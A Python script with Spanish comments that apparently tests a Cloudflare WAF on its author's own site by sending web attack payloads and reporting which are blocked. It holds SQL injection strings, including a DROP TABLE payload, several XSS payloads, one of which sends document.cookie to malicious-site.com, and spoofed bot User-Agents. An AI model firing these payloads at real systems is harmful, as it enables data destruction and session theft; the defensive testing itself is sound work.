import requests #pip install requests
import json
import time
from datetime import datetime

#Reemplaza esta URL con la que te dio Cloudflare Pages
URL_APLICACION = "https://www.proyredes.art"

def enviar_log_ataque(mensaje, tipo="info"):
    #Envía un log de ataque a la página web.
    try:
        datos = {
            "tipo": tipo,
            "mensaje": mensaje,
            "timestamp": datetime.now().strftime("%I:%M:%S %p"),
            "origen": "Atacante"
        }
        requests.post(f"{URL_APLICACION}/log", json=datos)
    except:
        #Si falla el envío, continuamos con el ataque
        pass

def simular_ataque_sqli():
    #Simula un ataque de inyección SQL con múltiples payloads.
    print("╠════════════════════════════════════════════════════════════╣")
    print("║ [~] Iniciando simulación de ataques SQL Injection (SQLi)...")
    print("╚════════════════════════════════════════════════════════════╝")
    print("\n[info] SQLi intenta manipular consultas SQL para acceder o modificar datos\n")
    
    #Lista de payloads comunes de SQLi
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT * FROM users--",
        "'; DROP TABLE users--",
        "' OR '1'='1' /*",
    ]
    
    for i, payload in enumerate(payloads, 1):
        objetivo = {
            0: "Bypass de autenticación",
            1: "Comentar resto de la consulta",
            2: "Extraer datos de tabla users",
            3: "Eliminar tabla de usuarios",
            4: "Bypass con comentarios alternativos"
        }[i-1]
        
        print(f"[#] Prueba #{i} - Payload: {payload}")
        print(f"    Objetivo: {objetivo}")
        
        #Enviar log del intento de ataque
        enviar_log_ataque(f"[~] Iniciando ataque SQLi #{i}: {objetivo}", "warning")
        
        #La petición maliciosa se envía en la URL
        peticion_sqli = f"{URL_APLICACION}/?search={payload}"
        print(f"    URL maliciosa: {peticion_sqli}")
        
        try:
            enviar_log_ataque(f"[#] Intentando SQLi: {payload}", "attack")
            headers = {
                "User-Agent": payload
                }
            respuesta = requests.get(peticion_sqli, headers=headers)

            print(f"\n    Código de respuesta: {respuesta.status_code}")
            print(f"    Headers de seguridad:")
            for header in ['cf-ray', 'cf-cache-status', 'cf-mitigated']:
                if header in respuesta.headers:
                    print(f"    - {header}: {respuesta.headers[header]}")
            
            if respuesta.status_code == 403:
                mensaje = "[✓] WAF bloqueó el ataque (403 Forbidden)"
                print("\n    " + mensaje)
                if 'cf-ray' in respuesta.headers:
                    id_bloqueo = respuesta.headers['cf-ray']
                    print(f"    [info] ID del bloqueo: {id_bloqueo}")
                    enviar_log_ataque(f"{mensaje}\n[info] ID del bloqueo: {id_bloqueo}", "success")
            else:
                mensaje = "[✖] ¡Atención! El ataque no fue bloqueado"
                print("\n    " + mensaje)
                contenido = respuesta.text[:200].replace('\n', '\n    ')
                print("    Contenido de la respuesta (primeros 200 caracteres):")
                print("    " + contenido)
                enviar_log_ataque(f"{mensaje}\nContenido expuesto: {contenido[:50]}...", "danger")
            
            time.sleep(1)
            
        except requests.exceptions.RequestException as e:
            print(f"\n    [✖] Error en la petición: {e}")

def simular_ataque_xss():
    #Simula múltiples variantes de ataques Cross-Site Scripting (XSS).
    print("\n╠════════════════════════════════════════════════════════════╣")
    print("║ [~] Iniciando simulación de ataques Cross-Site Scripting (XSS)...")
    print("╚════════════════════════════════════════════════════════════╝")
    print("\n[info] XSS permite inyectar scripts maliciosos que se ejecutan en el navegador de la víctima\n")
    
    #Lista de payloads XSS comunes con diferentes técnicas
    payloads_xss = [
        {
            "payload": "<script>alert('XSS')</script>",
            "descripcion": "XSS básico usando etiqueta script",
            "tipo": "Reflected XSS"
        },
        {
            "payload": "<img src='x' onerror='alert(\"XSS\")'>",
            "descripcion": "XSS usando evento onerror de imagen",
            "tipo": "DOM-based XSS"
        },
        {
            "payload": "<svg onload='fetch(\"http://malicious-site.com?cookie=\"+document.cookie)'>",
            "descripcion": "XSS para robo de cookies",
            "tipo": "Stored XSS"
        },
        {
            "payload": "javascript:alert('XSS')",
            "descripcion": "XSS en atributo href",
            "tipo": "DOM-based XSS"
        },
        {
            "payload": "<iframe src='javascript:alert(`XSS`)'>",
            "descripcion": "XSS usando iframe",
            "tipo": "Reflected XSS"
        }
    ]
    
    for i, payload_info in enumerate(payloads_xss, 1):
        print(f"[#] Prueba #{i} - {payload_info['tipo']}")
        print(f"    Descripción: {payload_info['descripcion']}")
        print(f"    Payload: {payload_info['payload']}")
        
        #Enviar log del intento de ataque
        enviar_log_ataque(f"[~] Iniciando ataque XSS #{i}: {payload_info['tipo']}", "warning")
        enviar_log_ataque(f"[info] Objetivo: {payload_info['descripcion']}", "info")
        
        #Se envía el payload tanto en URL como en POST
        datos_formulario = {
            "mensaje": payload_info['payload'],
            "comentario": "Test XSS"
        }
        
        #Probar GET request
        try:
            url_con_xss = f"{URL_APLICACION}/?input={payload_info['payload']}"
            enviar_log_ataque(f"[#] Intentando XSS via GET: {payload_info['payload']}", "attack")
            print(f"\n    [~] Probando GET request:")
            print(f"    URL: {url_con_xss}")
            
            headers = {
                 "Referer": payload_info['payload']
                 }
            respuesta = requests.get(url_con_xss, headers=headers)
            mostrar_resultado_ataque(respuesta)
            
            #Probar POST request
            print(f"\n    [~] Probando POST request:")
            print(f"    Datos: {datos_formulario}")
            
            respuesta = requests.post(f"{URL_APLICACION}/submit", data=datos_formulario, headers=headers)
            mostrar_resultado_ataque(respuesta)
            
            time.sleep(1)
            
        except requests.exceptions.RequestException as e:
            print(f"\n    [✖] Error en la petición: {e}")
            
def mostrar_resultado_ataque(respuesta):
    #Muestra el resultado detallado de un ataque.
    print(f"\n    Código de respuesta: {respuesta.status_code}")
    print(f"    Headers de seguridad:")
    for header in ['cf-ray', 'cf-cache-status', 'cf-mitigated', 'content-security-policy']:
        if header in respuesta.headers:
            print(f"    - {header}: {respuesta.headers[header]}")
    
    if respuesta.status_code == 403:
        print("\n    [✓] WAF bloqueó el ataque (403 Forbidden)")
        if 'cf-ray' in respuesta.headers:
            print(f"    [info] ID del bloqueo: {respuesta.headers['cf-ray']}")
    else:
        print("\n    [✖] ¡Atención! El ataque no fue bloqueado")
        print("    Contenido de la respuesta (primeros 200 caracteres):")
        print("    " + respuesta.text[:200].replace('\n', '\n    '))

def simular_ataque_bot():
    #Simula múltiples intentos de bots para evadir CAPTCHA/Challenge.
    print("\n╠════════════════════════════════════════════════════════════╣")
    print("║ [~] Iniciando simulación de ataques Bot/Captcha...")
    print("╚════════════════════════════════════════════════════════════╝")
    print("\n[info] Objetivo: Verificar que Cloudflare detiene intentos automatizados.\n")
    
    #Lista de identidades simuladas de bots
    user_agents_bots = [
        "python-requests/script-malicioso-v1",
        "Mozilla/5.0 (compatible; EvilBot/1.0)",
        "curl/7.64.1 (headless-scraper)",
        "Go-http-client/1.1 (bot-network)",
        "Apache-HttpClient/4.5.13 (Java/1.8)",
        "Wget/1.21.1 (linux-gnu)"
    ]

    for i, agente in enumerate(user_agents_bots, 1):
        print(f"\n[#] Intento de Bot #{i} de {len(user_agents_bots)}")
        print(f"    Identidad simulada: {agente}")
        
        try:
            headers = {
                "User-Agent": agente,
                "Accept": "text/html,application/xhtml+xml"
            }
            respuesta = requests.get(URL_APLICACION, headers=headers)
            
            print(f"\n    Código de respuesta: {respuesta.status_code}")
            if respuesta.status_code == 403:
                print("    [✓] WAF bloqueó el bot (403 Forbidden)")
                if 'cf-ray' in respuesta.headers:
                    print(f"    [info] ID del bloqueo: {respuesta.headers['cf-ray']}")
            else:
                print("    [✖] ¡Atención! El bot no fue bloqueado")
                contenido = respuesta.text[:200].replace('\n', '\n    ')
                print("    Contenido parcial de la respuesta:")
                print("    " + contenido)
            
            time.sleep(1)
        
        except requests.exceptions.RequestException as e:
            print(f"    [✖] Error en la petición: {e}")

if __name__ == "__main__":
    print("\n╠════════════════════════════════════════════════════════════╣")
    print("║ Script de Simulación de Ataques Web - Prueba de Seguridad ║")
    print("╚════════════════════════════════════════════════════════════╝")
    print("\n[info] Este script simula tres tipos comunes de ataques web para probar la seguridad:")
    print("\n[#] 1. SQL Injection (SQLi):")
    print("    - Intenta explotar vulnerabilidades en la base de datos")
    print("    - El WAF debe detectar y bloquear patrones maliciosos en la URL")
    
    print("\n[#] 2. Cross-Site Scripting (XSS):")
    print("    - Intenta inyectar código JavaScript malicioso")
    print("    - El WAF debe detectar y bloquear scripts maliciosos")
    
    print("\n[#] 3. Bots/Captcha:")
    print("    - Simula intentos automatizados con diferentes User-Agent")
    print("    - El WAF/Challenge debe bloquear o lanzar CAPTCHA")
    
    print(f"\n[info] URL objetivo: {URL_APLICACION}")
    print("╠════════════════════════════════════════════════════════════╣\n")
    
    input("[~] Presiona Enter para iniciar la simulación de ataques...")
    
    #Ejecutar la simulación de SQLi
    simular_ataque_sqli()
    
    print("\n╠════════════════════════════════════════════════════════════╣\n")
    time.sleep(2)
    
    #Ejecutar la simulación de XSS
    simular_ataque_xss()
    
    print("\n╠════════════════════════════════════════════════════════════╣\n")
    time.sleep(2)
    
    #Ejecutar la simulación de Bots/Captcha
    simular_ataque_bot()
    
    print("\n╠════════════════════════════════════════════════════════════╣")
    print("║ [✓] Auditoría finalizada.")
    print("╚════════════════════════════════════════════════════════════╝")